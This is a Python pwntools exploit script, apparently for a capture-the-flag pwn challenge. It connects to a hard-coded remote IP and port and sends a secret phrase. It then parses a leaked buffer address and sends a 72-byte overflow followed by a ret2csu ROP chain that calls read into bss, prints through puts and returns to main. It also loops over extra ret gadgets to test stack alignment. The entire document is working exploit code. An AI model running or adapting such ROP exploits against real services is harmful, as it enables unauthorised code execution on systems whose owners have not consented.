#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

def run_test(desc, padding_extra=0):
    r = remote('154.57.164.77', 32702)
    r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
    r.recvuntil(b'[0x')
    buf_leak = int(r.recvuntil(b']')[:-1], 16)
    r.recvuntil(b'wish for next year: ')

    csu_pop = 0x401512
    csu_call = 0x4014f8
    pop_rdi = 0x4011f2
    ret = 0x401016
    got_read = 0x403250
    bss = 0x404040

    payload = b'A' * 72
    # padding_extra extra ret gadgets
    for _ in range(padding_extra):
        payload += p64(ret)
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(0) + p64(bss) + p64(0x20) + p64(got_read)
    payload += p64(csu_call)
    payload += p64(0) + p64(0)*6
    payload += p64(pop_rdi) + p64(bss)
    payload += p64(0x401040)  # puts@plt
    payload += p64(0x401393)  # main

    r.send(payload)
    import time
    time.sleep(0.3)
    r.send(b'TEST_ALIGN\n')
    time.sleep(1)
    try:
        data = r.recv(timeout=3)
        r.close()
        if b'TEST_ALIGN' in data and b'Spooktober' in data:
            print(f'{desc}: WORKS (main reached!)')
            return True
        elif b'TEST_ALIGN' in data:
            print(f'{desc}: partial (CSU+puts OK, main not reached)')
            return False
        else:
            print(f'{desc}: FAIL ({data[:100]})')
            return False
    except:
        print(f'{desc}: EOFError')
        return False

for pads in [0, 1, 2, 3]:
    run_test(f'pads={pads}', pads)
